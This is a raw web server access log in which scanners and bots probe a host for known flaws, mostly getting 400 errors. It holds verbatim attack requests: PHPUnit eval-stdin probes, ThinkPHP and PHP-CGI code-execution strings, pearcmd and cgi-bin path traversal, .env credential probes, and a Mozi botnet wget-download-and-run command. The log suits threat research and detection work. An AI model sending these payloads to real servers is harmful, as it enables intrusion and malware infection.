123.253.22.7 - - [17/Oct/2025:20:36:53 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:53 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:54 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:54 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:55 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:55 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:56 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:56 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:57 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:57 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:58 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:58 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:58 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:36:59 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:37:00 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:37:00 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:37:01 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:37:01 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:37:02 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 400 154 "-" "libredtail-http" "-"
123.253.22.7 - - [17/Oct/2025:20:37:02 +0000] "GET /containers/json HTTP/1.1" 400 154 "-" "libredtail-http" "-"
204.76.203.219 - - [17/Oct/2025:21:13:30 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
104.253.212.25 - - [17/Oct/2025:21:14:49 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
104.253.212.25 - - [17/Oct/2025:21:14:50 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
87.121.84.17 - - [17/Oct/2025:21:18:14 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
185.242.226.110 - - [17/Oct/2025:21:37:04 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03^d\xE9\xD7\x8C\xD3*\xC2\x13ir\xF3[\xD4\x1F\x94_f\xE7-\xE6\xB3k\x9CG\xA3\x11U\xE2K\x8B\x14\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
92.113.83.154 - - [17/Oct/2025:22:05:00 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
92.113.83.154 - - [17/Oct/2025:22:05:01 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
103.152.255.223 - - [17/Oct/2025:22:12:42 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
103.152.255.223 - - [17/Oct/2025:22:12:43 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 150 "-" "-" "-"
103.152.255.223 - - [17/Oct/2025:22:12:44 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:45 +0000] "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:45 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:46 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:48 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:49 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:50 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:51 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:52 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:53 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:55 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:56 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:56 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:57 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:58 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:58 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:59 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:59 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:12:59 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:00 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:01 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:01 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:02 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:03 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:04 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:04 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:05 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:06 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:09 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:09 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:10 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:11 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:12 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:13 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:13 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:14 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:15 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:16 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:16 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:17 +0000] "GET /index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:19 +0000] "GET /public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:21 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:21 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 400 154 "-" "libredtail-http" "-"
103.152.255.223 - - [17/Oct/2025:22:13:22 +0000] "GET /containers/json HTTP/1.1" 400 154 "-" "libredtail-http" "-"
20.221.57.26 - - [17/Oct/2025:22:17:41 +0000] "GET /portal/redlion HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
87.121.84.17 - - [17/Oct/2025:22:54:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
138.36.155.73 - - [17/Oct/2025:23:00:02 +0000] "GET /robots.txt HTTP/1.0" 400 143 "-" "xfa1" "-"
204.76.203.219 - - [17/Oct/2025:23:05:00 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
20.55.88.105 - - [17/Oct/2025:23:26:26 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
34.78.245.104 - - [17/Oct/2025:23:35:21 +0000] "GET / HTTP/1.1" 400 154 "-" "python-requests/2.32.5" "-"
131.196.48.84 - - [18/Oct/2025:00:35:43 +0000] "GET /robots.txt HTTP/1.0" 400 143 "-" "xfa1" "-"
107.170.42.197 - - [18/Oct/2025:00:45:05 +0000] "GET /get_config.php HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
87.121.84.17 - - [18/Oct/2025:00:58:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:00:58:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
176.65.141.226 - - [18/Oct/2025:01:12:48 +0000] "GET /login.rsp HTTP/1.1" 400 154 "-" "Hello World" "-"
93.174.93.12 - - [18/Oct/2025:01:19:01 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-" "-"
93.174.93.12 - - [18/Oct/2025:01:20:30 +0000] "GET / HTTP/1.0" 400 143 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 MicroMessenger/7.0.5(0x17000523) NetType/WIFI Language/zh_CN" "-"
64.31.4.73 - - [18/Oct/2025:01:29:14 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
64.31.4.73 - - [18/Oct/2025:01:29:14 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
87.121.84.17 - - [18/Oct/2025:02:22:07 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
155.254.61.79 - - [18/Oct/2025:02:50:11 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
155.254.61.79 - - [18/Oct/2025:02:50:11 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
3.130.96.91 - - [18/Oct/2025:02:53:27 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
3.130.96.91 - - [18/Oct/2025:02:58:26 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03*\xDD\x0B4\xEB\x0C\xADh\xC3\xA2\xC1b\xBB]Vv\xFD\xA9\xA0\x15\x07\xD7\x09nh(\xD0%\x02\xCD\x18;\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
204.76.203.219 - - [18/Oct/2025:02:59:41 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
3.130.96.91 - - [18/Oct/2025:03:00:20 +0000] "SSH-2.0-Go" 400 150 "-" "-" "-"
3.130.96.91 - - [18/Oct/2025:03:00:38 +0000] "" 400 0 "-" "-" "-"
3.130.96.91 - - [18/Oct/2025:03:02:50 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xC6\x1CI\xA4\x87\xA6\xC3\x96\x918\xA5G\xED\xCA\xF6y\xA7\xC8\xC48\xCC\xA5\xFD\x9DA\xDE\x9D\xD8\xDCH+\x12\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
176.65.141.226 - - [18/Oct/2025:03:03:36 +0000] "GET /login.rsp HTTP/1.1" 400 154 "-" "Hello World" "-"
184.105.139.68 - - [18/Oct/2025:04:29:16 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03H" 400 150 "-" "-" "-"
87.121.84.17 - - [18/Oct/2025:04:37:20 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
163.47.34.82 - - [18/Oct/2025:04:43:01 +0000] "GET /robots.txt HTTP/1.0" 400 143 "-" "xfa1" "-"
45.82.78.102 - - [18/Oct/2025:04:45:11 +0000] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\xD1\x99I\x82=\xB6\xC7\xFF\xEA\xE5#\xDF\x0B\x9CTU\x81\xD2u\xB0/Pe\x14\x9E\x92\x9C>\x01\xA6D\x9F \xA34J\xBC\xF8\x5C\xE2^<\xC0\xFF\xB7\xFBs4\x8A<\xEFc\xB6DR\x8ES\xE1\xFCW__,\x86F\x00\x1A\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
45.82.78.102 - - [18/Oct/2025:04:45:22 +0000] "\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03x\xA4\x16k\xBA\xEB\xC6\x85k\xF1y\xC8\x92\xD3\x1C\xFCe\xD1j\xB1`[\xCF\x9B\x9F\xF9\x11lgYI\xA6 \x9A" 400 150 "-" "-" "-"
45.82.78.102 - - [18/Oct/2025:04:45:22 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" "-"
45.82.78.113 - - [18/Oct/2025:04:45:38 +0000] "GET /favicon.ico HTTP/1.1" 400 154 "http://3.149.120.21/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" "-"
61.0.87.14 - - [18/Oct/2025:04:58:23 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 150 "-" "-" "-"
204.76.203.219 - - [18/Oct/2025:04:59:37 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
20.65.192.150 - - [18/Oct/2025:05:24:26 +0000] "GET /manager/html HTTP/1.1" 400 154 "-" "Mozilla/5.0 zgrab/0.x" "-"
146.19.24.116 - - [18/Oct/2025:05:24:27 +0000] "GET / HTTP/1.1" 400 154 "-" "python-httpx/0.28.1" "-"
20.168.0.47 - - [18/Oct/2025:06:17:38 +0000] "MGLNDD_3.149.120.21_80" 400 150 "-" "-" "-"
87.121.84.17 - - [18/Oct/2025:06:31:29 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
155.254.34.8 - - [18/Oct/2025:06:41:27 +0000] "GET /.env HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
155.254.34.8 - - [18/Oct/2025:06:41:27 +0000] "POST / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36" "-"
204.76.203.219 - - [18/Oct/2025:06:48:06 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
194.187.176.146 - - [18/Oct/2025:07:13:49 +0000] "GET /DevicesGateway/apps/system-app-metadata/1?packageId=../../../../API/system/users/search%3fpagesize=1 HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" "-"
176.65.141.226 - - [18/Oct/2025:07:41:42 +0000] "GET /login.rsp HTTP/1.1" 400 154 "-" "Hello World" "-"
198.235.24.173 - - [18/Oct/2025:07:44:43 +0000] "GET / HTTP/1.0" 400 143 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
170.106.192.3 - - [18/Oct/2025:07:49:45 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
43.135.144.126 - - [18/Oct/2025:07:50:00 +0000] "GET / HTTP/1.1" 200 400 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
139.59.20.185 - - [18/Oct/2025:08:08:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFB\xB5\x95\xCB\xF6\xF3j\xE4\xF0U\xA0Ww\x03%\xA2s4Q\xAFH#=?\x95\xA3qq\x8A\xAD\xC9\x86\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
139.59.20.185 - - [18/Oct/2025:08:08:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x031\x8D\x10o\x01?h\xF5Q\xF0\xB6b" 400 150 "-" "-" "-"
139.59.20.185 - - [18/Oct/2025:08:08:43 +0000] "GET / HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
139.59.20.185 - - [18/Oct/2025:08:08:43 +0000] "GET /form.html HTTP/1.1" 400 154 "-" "curl/8.1.2" "-"
139.59.20.185 - - [18/Oct/2025:08:08:44 +0000] "GET /upl.php HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
139.59.20.185 - - [18/Oct/2025:08:08:44 +0000] "GET /t4 HTTP/1.1" 400 154 "-" "Mozilla/5.0" "-"
139.59.20.185 - - [18/Oct/2025:08:08:45 +0000] "GET /geoip/ HTTP/1.1" 400 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
